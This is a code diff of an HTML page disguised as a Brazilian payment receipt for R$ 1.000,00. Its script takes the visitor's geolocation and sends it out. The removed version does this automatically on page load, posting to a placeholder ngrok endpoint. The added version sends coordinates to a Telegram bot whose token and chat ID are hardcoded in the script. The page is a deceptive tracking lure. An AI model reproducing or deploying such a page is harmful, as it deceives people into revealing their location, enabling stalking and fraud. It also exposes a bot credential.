@@ -1,70 +1,157 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Comprovante de Recebimento</title>
-  <link rel="stylesheet" href="styles.css" />
+  <link rel="stylesheet" href="styles.css">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      padding: 20px;
+      color: #333;
+    }
+
+    .comprovante-container {
+      background-color: white;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      width: 80%;
+      margin: 0 auto;
+    }
+
+    h1 {
+      text-align: center;
+      color: #1c74d5;
+    }
+
+    .informacoes {
+      margin-top: 20px;
+      font-size: 16px;
+    }
+
+    .informacoes p {
+      margin: 10px 0;
+    }
+
+    .informacoes span {
+      font-weight: bold;
+    }
+
+    .botao {
+      display: block;
+      width: 100%;
+      padding: 10px;
+      background-color: #28a745;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+      margin-top: 20px;
+    }
+
+    .botao:hover {
+      background-color: #218838;
+    }
+
+    .comprovante-footer {
+      text-align: center;
+      margin-top: 30px;
+      font-size: 14px;
+    }
+
+    .comprovante-footer a {
+      color: #1c74d5;
+      text-decoration: none;
+    }
+  </style>
 </head>
+
 <body>
   <div class="comprovante-container">
     <h1>Comprovante de Recebimento</h1>
+
     <div class="informacoes">
       <p><span>Data:</span> <span id="data-atual"></span></p>
       <p><span>Valor Recebido:</span> R$ 1.000,00</p>
       <p><span>De:</span> João Silva de Oliveira</p>
       <p><span>Status:</span> Recebido com Sucesso</p>
     </div>
+
     <button class="botao" onclick="window.print()">Imprimir</button>
+
     <div class="comprovante-footer">
       <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
       <p><a href="#">Clique aqui</a> para mais informações.</p>
     </div>
+
+    <button class="botao" onclick="getLocation()">Enviar Localização</button>
   </div>
 
   <script>
-    window.addEventListener("load", () => {
+    // Preencher data atual
+    const dataAtual = new Date();
+    const dia = String(dataAtual.getDate()).padStart(2, '0');
+    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
+    const ano = dataAtual.getFullYear();
+    const dataFormatada = `${dia}/${mes}/${ano}`;
+    document.getElementById("data-atual").textContent = dataFormatada;
+
+    // Função para obter a localização
+    function getLocation() {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+        navigator.geolocation.getCurrentPosition(sendLocation, showError);
       } else {
-        alert("Algo deu errado. Tente novamente mais tarde.");
+        alert("Geolocalização não é suportada por este navegador.");
       }
-
-      const dataAtual = new Date();
-      const dia = String(dataAtual.getDate()).padStart(2, '0');
-      const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
-      const ano = dataAtual.getFullYear();
-      const dataFormatada = `${dia}/${mes}/${ano}`;
-      document.getElementById("data-atual").textContent = dataFormatada;
-    });
-
-    function sendLocation(position) {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
-      // Substitua abaixo pela sua URL do Ngrok ao rodar localmente
-      fetch("https://SEU_NGROK_URL/send-location", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ latitude, longitude, maps })
-      })
-      .then(response => response.json())
-      .then(data => {
-        if (!data.success) {
-          alert("Erro ao enviar o comprovante.");
-        }
-      })
-      .catch(error => {
-        console.error("Erro:", error);
-      });
     }
 
-    function handleError(error) {
-      alert("Erro ao obter a localização: " + error.message);
+    // Enviar localização para o Telegram
+    function sendLocation(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+
+      // Substitua pelos seus dados reais (não deixe visível em um repositório público)
+      const telegramBotToken = "7964496822:AAFCBrNEI0b0oYQOFimCMobsWi_peVjN0wY"; // Seu token do bot
+      const chatId = "6045619916"; // Seu chat ID (ID do usuário ou grupo do Telegram)
+
+      const url = `https://api.telegram.org/bot${telegramBotToken}/sendLocation?chat_id=${chatId}&latitude=${lat}&longitude=${lon}`;
+
+      fetch(url)
+        .then(response => response.json())
+        .then(data => {
+          if (data.ok) {
+            alert("Localização enviada com sucesso!");
+          } else {
+            alert("Erro ao enviar localização: " + JSON.stringify(data));
+          }
+        })
+        .catch(error => {
+          alert("Erro na comunicação com a API do Telegram: " + error);
+        });
+    }
+
+    // Mostrar erro caso a localização não seja obtida
+    function showError(error) {
+      switch(error.code) {
+        case error.PERMISSION_DENIED:
+          alert("Usuário negou a solicitação de localização.");
+          break;
+        case error.POSITION_UNAVAILABLE:
+          alert("A posição não está disponível.");
+          break;
+        case error.TIMEOUT:
+          alert("O tempo de solicitação expirou.");
+          break;
+        case error.UNKNOWN_ERROR:
+          alert("Erro desconhecido.");
+          break;
+      }
     }
   </script>
 </body>
+
 </html>
